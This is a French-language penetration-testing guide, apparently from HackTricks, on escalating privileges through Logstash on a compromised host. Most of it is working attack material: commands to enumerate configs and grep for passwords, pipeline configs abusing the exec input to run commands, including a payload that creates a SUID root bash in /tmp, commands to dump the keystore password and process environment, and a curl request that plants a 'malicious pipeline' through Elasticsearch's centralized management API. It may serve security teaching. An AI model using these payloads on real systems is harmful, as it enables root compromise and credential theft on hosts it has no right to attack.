# Escalade de privilèges Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash est utilisé pour **collecter, transformer et distribuer les logs** via un système appelé **pipelines**. Ces pipelines sont composés de phases d’**input**, de **filter** et d’**output**. Un aspect intéressant se présente lorsque Logstash s’exécute sur une machine compromise.

### Configuration du pipeline

Les pipelines sont configurés dans le fichier **/etc/logstash/pipelines.yml**, qui répertorie les emplacements des configurations des pipelines :
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ce fichier révèle où se trouvent les fichiers **.conf** contenant les configurations des pipelines. Lorsqu’un **Elasticsearch output module** est utilisé, il est courant que les **pipelines** contiennent des identifiants Elasticsearch, qui disposent souvent de privilèges étendus, car Logstash doit écrire des données dans Elasticsearch. Les wildcards dans les chemins de configuration permettent à Logstash d’exécuter tous les pipelines correspondants dans le répertoire indiqué.

Si Logstash est démarré avec `-f <directory>` au lieu de `pipelines.yml`, **tous les fichiers de ce répertoire sont concaténés dans l’ordre lexicographique et analysés comme une seule configuration**. Cela crée 2 implications offensives :

- Un fichier déposé comme `000-input.conf` ou `zzz-output.conf` peut modifier la manière dont le pipeline final est assemblé
- Un fichier malformé peut empêcher le chargement de l’ensemble du pipeline ; validez donc soigneusement les payloads avant de compter sur l’auto-reload

### Fast Enumeration on a Compromised Host

Sur une machine où Logstash est installé, inspectez rapidement :
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Vérifiez également si l’API de monitoring locale est accessible. Par défaut, elle se lie à **127.0.0.1:9600**, ce qui est généralement suffisant après avoir pris pied sur l’hôte :
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Cela vous donne généralement les IDs des pipelines, les détails d’exécution et la confirmation que votre pipeline modifié a été chargé.

Les identifiants récupérés depuis Logstash permettent souvent d’accéder à **Elasticsearch**. Consultez donc [cette autre page sur Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Élévation de privilèges via des pipelines inscriptibles

Pour tenter une élévation de privilèges, identifiez d’abord l’utilisateur sous lequel le service Logstash s’exécute, généralement l’utilisateur **logstash**. Assurez-vous de remplir **l’un** de ces critères :

- Posséder un **accès en écriture** à un fichier de pipeline **.conf** **ou**
- Le fichier **/etc/logstash/pipelines.yml** utilise un wildcard, et vous pouvez écrire dans le dossier cible

De plus, **l’une** de ces conditions doit être remplie :

- Pouvoir redémarrer le service Logstash **ou**
- Le fichier **/etc/logstash/logstash.yml** contient le paramètre **config.reload.automatic: true**

Lorsqu’un wildcard est présent dans la configuration, créer un fichier correspondant à ce wildcard permet d’exécuter des commandes. Par exemple :
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ici, **interval** détermine la fréquence d'exécution en secondes. Dans l'exemple donné, la commande **whoami** s'exécute toutes les 120 secondes, et sa sortie est dirigée vers **/tmp/output.log**.

Avec **config.reload.automatic: true** dans **/etc/logstash/logstash.yml**, Logstash détecte et applique automatiquement les nouvelles configurations de pipeline ou celles qui ont été modifiées, sans nécessiter de redémarrage.<sup>[[1]](#references)</sup> En l'absence de wildcard, il est toujours possible de modifier les configurations existantes, mais il est recommandé de faire preuve de prudence afin d'éviter les interruptions.

### Payloads de pipeline plus fiables

Le plugin d'entrée `exec` fonctionne toujours dans les versions actuelles et nécessite soit un `interval`, soit un `schedule`. Il s'exécute en **forkant** la JVM de Logstash ; si la mémoire est limitée, votre payload peut échouer avec `ENOMEM` au lieu de s'exécuter silencieusement.

Un payload d'élévation de privilèges plus pratique est généralement celui qui laisse un artefact persistant :
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si vous n’avez pas les droits de redémarrage mais pouvez envoyer un signal au processus, Logstash prend également en charge un rechargement déclenché par **SIGHUP** sur les systèmes de type Unix :<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Sachez que tous les plugins ne prennent pas en charge le rechargement. Par exemple, l’input **stdin** empêche le rechargement automatique ; ne supposez donc pas que `config.reload.automatic` prendra toujours en compte vos modifications.<sup>[[1]](#references)</sup>

### Vol de secrets depuis Logstash

Avant de vous concentrer uniquement sur l’exécution de code, récupérez les données auxquelles Logstash a déjà accès :

- Les identifiants en clair sont souvent codés en dur dans les outputs `elasticsearch {}`, `http_poller`, les inputs JDBC ou les paramètres liés au cloud
- Les paramètres sécurisés peuvent se trouver dans **`/etc/logstash/logstash.keystore`** ou dans un autre répertoire `path.settings`
- Le mot de passe du keystore est fréquemment fourni via **`LOGSTASH_KEYSTORE_PASS`**, et les installations basées sur des paquets le chargent généralement depuis **`/etc/sysconfig/logstash`**
- L’expansion des variables d’environnement avec `${VAR}` est résolue au démarrage de Logstash ; l’environnement du service mérite donc d’être inspecté

Vérifications utiles :
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Cela vaut également la peine d’être vérifié, car **CVE-2023-46672** a montré que Logstash pouvait enregistrer des informations sensibles dans les logs dans certaines circonstances. Sur un hôte de post-exploitation, les anciens logs de Logstash et les entrées `journald` peuvent donc divulguer des identifiants, même si la configuration actuelle fait référence au keystore au lieu de stocker les secrets inline.<sup>[[3]](#references)</sup>

### Abus de la gestion centralisée des pipelines

Dans certains environnements, l’hôte ne s’appuie pas du tout sur des fichiers `.conf` locaux. Si **`xpack.management.enabled: true`** est configuré, Logstash peut récupérer des pipelines gérés de manière centralisée depuis Elasticsearch/Kibana et, après l’activation de ce mode, les configurations locales des pipelines ne constituent plus la source de vérité.<sup>[[2]](#references)</sup>

Cela signifie qu’une autre voie d’attaque est possible :

1. Récupérer les identifiants Elastic depuis les paramètres locaux de Logstash, le keystore ou les logs
2. Vérifier si le compte dispose du privilège de cluster **`manage_logstash_pipelines`**
3. Créer ou remplacer un pipeline géré de manière centralisée afin que l’hôte Logstash exécute votre payload lors de son prochain intervalle de polling

L’API Elasticsearch utilisée par cette fonctionnalité est la suivante :<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
This is especially useful when local files are read-only but Logstash is already registered to fetch pipelines remotely.

## Références

- [1] [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
